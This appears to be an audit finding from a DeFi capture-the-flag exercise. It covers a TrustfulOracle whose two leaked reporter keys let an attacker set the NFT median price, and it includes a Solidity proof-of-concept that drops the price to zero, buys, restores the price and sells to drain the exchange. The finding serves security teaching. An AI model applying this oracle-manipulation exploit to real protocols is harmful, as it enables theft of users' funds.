### [H-1] Leaked oracle reporter private keys enable median price manipulation and exchange drain

**Description:** The `TrustfulOracle` computes `DVNFT` price as the median of 3 
trusted reporters. Two of the three reporters' private keys were leaked via an 
encoded HTTP response (hex → base64 → raw private key). With 2 of 3 reporters 
compromised, an attacker fully controls the median price, since any 2 matching 
values determine the median regardless of the third honest reporter.

**Impact:** An attacker can manipulate the NFT price to near-zero to buy at 
negligible cost, then restore (or inflate) the price to sell back at the 
original valuation — draining the exchange's entire ETH balance while leaving 
the recorded oracle price unchanged, masking the attack.

**Proof of Concept:**
1. Derive addresses from the two leaked private keys using `vm.addr()`.
2. As both compromised reporters, post a price of 0 for DVNFT — median becomes 0.
3. Buy one DVNFT for negligible cost.
4. As both compromised reporters, post price back to the original value.
5. Sell the NFT back to the exchange at full price, draining its ETH balance.
6. Forward all proceeds to the recovery account.

<details>
<summary>Example Code Snippet</summary>

```solidity
uint256 privateKey1 = 0x68bd...;
uint256 privateKey2 = 0x7d15...;
address source1 = vm.addr(privateKey1);
address source2 = vm.addr(privateKey2);

vm.prank(source1);
oracle.postPrice(nft.symbol(), 0);
vm.prank(source2);
oracle.postPrice(nft.symbol(), 0);

vm.prank(player);
uint256 tokenId = exchange.buyOne{value: 1}();

vm.prank(source1);
oracle.postPrice(nft.symbol(), EXCHANGE_INITIAL_ETH_BALANCE);
vm.prank(source2);
oracle.postPrice(nft.symbol(), EXCHANGE_INITIAL_ETH_BALANCE);

vm.startPrank(player);
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
```
</details>

**Recommended Mitigation:**
1. Increase reporter count and quorum threshold so no single leak (or pair) 
   can control the median — require N-of-M with N significantly above 50%.
2. Add price deviation circuit breakers — reject price updates that deviate 
   drastically from recent historical values without a time-weighted average.
3. Rotate and securely store reporter keys; never expose them via any 
   server response, logging, or debug endpoint.